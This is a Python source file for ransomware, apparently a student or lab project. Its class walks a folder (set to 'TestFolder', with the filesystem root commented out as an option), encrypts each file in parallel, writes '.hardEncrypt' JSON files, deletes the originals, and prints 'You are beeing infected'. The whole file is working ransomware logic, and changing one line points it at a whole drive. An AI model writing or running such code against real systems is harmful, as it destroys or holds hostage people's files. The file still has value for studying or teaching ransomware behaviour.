

import os
import json
from file_encryption.rsa_key import *
from file_encryption.file_encryption import *
from base64 import b64encode
# Global Constants
import concurrent.futures

class Ramsomware(object):
    
    
    

    def __init__(self):
         self.notencript=[ "rsa_key_public.pem", "rsa_key_private.pem","file_encryption.py", "file_decryption.py","rsa_key.py", "ransomware.py", "cure.py", "ransomware.exe", "cure.exe", "__pycache__"
, "build"]
         self.enc=FileEncript()
         self.keygen=RSAkeygeneration()
         
    def callEncript(self,file_name,dirName):
        
     file_path = os.path.join(dirName, file_name)
                
     if ( not file_name in self.notencript ):
       
        print("[*] %s" % file_path)
        
     
        
        
        RSACipher, C, IV, tag, ext = self.enc.MyRSAEncrypt(file_path, self.notencript[0])
        
        #Nombre y extension del fichero
        name, extension = os.path.splitext(file_name)
        file_name_new = name + ".hardEncrypt"
        file_path_new = os.path.join(dirName, file_name_new)
       
        with open(file_path_new, "w") as filePath:
            file = {}
            
            # Estructura de fichero
            file["RSACipher"] = b64encode(RSACipher).decode("utf-8")
            file["C"] = b64encode(C).decode("utf-8")
            file["IV"] = b64encode(IV).decode("utf-8")
            file["tag"] = b64encode(tag).decode("utf-8")
            file["ext"] = ext
            
            # Crear fichero json
            
            json.dump(file, filePath)
            filePath.close()
            # Borrado de antiguo fichero
            print("[^^] %s" % file_path)
            if os.path.exists(file_path):
                os.remove(file_path)
            else:
               print("The file does not exist")
          
    
    
    
    
    def encriptFiles(self):
        # Begin file walk
        path=os.path.abspath(os.getcwd())
     
        path=path + "\\file_encryption"
        print(path)
        os.chdir(path)
        rootDir = "TestFolder" #os.path.abspath('.').split(os.path.sep)[0]+os.path.sep 
        exclude = [self.notencript[-1], self.notencript[-2]]
        for dirName, subdirList, fileList in os.walk(rootDir):
            aux=[]
            subdirList[:] = [d for d in subdirList if d not in exclude]
            
            print("[+] %s" % dirName)
            aux.append(dirName)
            dirName=aux*len(fileList)
            if(len(fileList)>0):
             #Encriptado en paralelo
             with concurrent.futures.ThreadPoolExecutor(max_workers=len(fileList)) as executor:
                     executor.map(self.callEncript, fileList,dirName)
            
                        
                        
                        
    
            
            
    def beginEncript(self):
        #os.chdir("file_encryption")
        path=os.path.abspath(os.getcwd())
        print(path)
        # Simple prompt
        print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
        print("You are beeing infected")
        print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
        
        # Comprobar RSA
        self.keygen.genPrivPublic()
        
        # Empezar encriptado
        self.encriptFiles()       
            
            
                        
if __name__ == '__main__': 
    
    pp = Ramsomware()
    pp.beginEncript()